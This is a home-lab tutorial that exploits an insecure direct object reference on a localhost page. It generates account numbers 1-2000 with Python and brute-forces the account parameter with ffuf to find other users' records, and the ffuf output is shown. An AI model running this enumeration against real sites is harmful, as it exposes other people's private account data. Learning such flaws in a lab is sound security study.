# IDOR - Insecure Direct Object Reference

- On login to the account we have got our account details.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/53d24180-6d47-4991-919e-08d247f586d8)

- On a quick look at the URL we have got an account with a number.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/2c81666e-d727-4d30-bbb4-eae8e06d3403)

- by changing the number to any random characters we got the details of another user easily.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/21c87ca6-435a-4cb5-926f-0d4463737e42)

- To get details of all users we will make a file of 1-2000 numbers to exploit the account.
- For this, we will use Python code to create a file of numbers.

```python
python3 -c 'for i in range (1,2001): print (i)' > num.txt
```
- Now, we will use a tool named ffuf.
- Command: `ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -fs 849 | grep FUZZ`

```bash
└─$ ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -fs 849 | grep FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/e0x02.php?account=FUZZ
 :: Wordlist         : FUZZ: /home/singhx/labs/PEH/XSS/num.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 849
________________________________________________

    * FUZZ: 1002
    * FUZZ: 1000
    * FUZZ: 1001
    * FUZZ: 1003
    * FUZZ: 1005
    * FUZZ: 1006
    * FUZZ: 1008
    * FUZZ: 1009
    * FUZZ: 1011
    * FUZZ: 1007
    * FUZZ: 1012
    * FUZZ: 1013
    * FUZZ: 1016
    * FUZZ: 1010
    * FUZZ: 1014
    * FUZZ: 1015
    * FUZZ: 1017
    * FUZZ: 1018
    * FUZZ: 1019
    * FUZZ: 1004
:: Progress: [2000/2000] :: Job [1/1] :: 51 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- Now, we can copy the account number and see the account details of the user.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c7dc4444-5e4a-4f88-9bb3-4a84df4dc08f)

- Similarly, we can check for other accounts too.
